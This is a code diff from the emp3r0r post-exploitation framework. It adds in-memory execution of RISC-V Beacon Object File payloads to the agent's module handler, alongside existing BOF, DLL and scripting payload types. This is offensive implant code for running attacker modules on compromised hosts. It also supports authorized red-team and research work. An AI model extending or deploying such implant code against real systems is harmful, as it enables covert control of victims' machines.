@@ -12,6 +12,8 @@ import (
 	"github.com/jm33-m0/emp3r0r/core/internal/def"
 	"github.com/jm33-m0/emp3r0r/core/lib/crypto"
 	"github.com/jm33-m0/emp3r0r/core/lib/memdeps"
+	"github.com/jm33-m0/emp3r0r/core/lib/modconfig"
+	"github.com/jm33-m0/emp3r0r/core/lib/rvvm"
 	"github.com/jm33-m0/emp3r0r/core/lib/script"
 	"github.com/jm33-m0/emp3r0r/core/lib/util"
 )
@@ -127,9 +129,9 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 	invocation.Token = tokenKey
 
 	// switch on payload type, in memory execution. Only in-process payloads
-	// are supported: coff (BOF), starlark, dll and so (Linux shared-library
-	// dependency). Everything that would fork-and-run an interpreter or an
-	// on-disk executable was removed.
+	// are supported: coff (BOF), starlark, dll, rv (RISC-V guest) and so
+	// (Linux shared-library dependency). Everything that would fork-and-run an
+	// interpreter or an on-disk executable was removed.
 	switch payload_type {
 	case "starlark":
 		err = executeWithToken(invocation.Token, func(token uintptr) error {
@@ -179,13 +181,32 @@ func ModuleHandler(peerIP, file_to_download, payload_type, modName, checksum str
 			return logging.Sprintf("token impersonation failed: %v", err)
 		}
 		return out
+	case "rv":
+		// Portable BOF: an RV32 ET_REL object relocated against the
+		// interpreter's embedded Beacon/libc runtime and called at its
+		// coff_export. The interpreter dependency (rvvm_linux or rvvm_windows)
+		// is mapped only for this run and unmapped by memdeps.Use.
+		var libs [][]byte
+		for _, memPath := range moduleFiles {
+			data, readErr := util.ReadFileAgent(memPath)
+			if readErr != nil {
+				return logging.Sprintf("reading RISC-V library %s: %v", memPath, readErr)
+			}
+			libs = append(libs, data)
+		}
+		out, err = rvvm.RunRiscvBof(payload_data, invocation.Coff.Export,
+			modconfig.CoffArgsFromResolved(invocation.Coff), libs)
+		if err != nil {
+			out = logging.Sprintf("running RISC-V module: %v", err)
+		}
+		return out
 	case "so":
 		// Shared-library dependency (e.g. libbpf). Cache it under the name the
 		// ebpf_* builtins fetch, but do not try to run it.
 		_ = util.WriteFileAgent("memfs:///"+modName+".so", payload_data, 0o600)
 		return logging.Sprintf("%s is a shared-library dependency; use the ebpf_* script builtins", modName)
 	default:
-		return logging.Sprintf("unsupported payload type %s (supported: coff, starlark, dll, so)", payload_type)
+		return logging.Sprintf("unsupported payload type %s (supported: coff, starlark, dll, rv, so)", payload_type)
 	}
 }
 
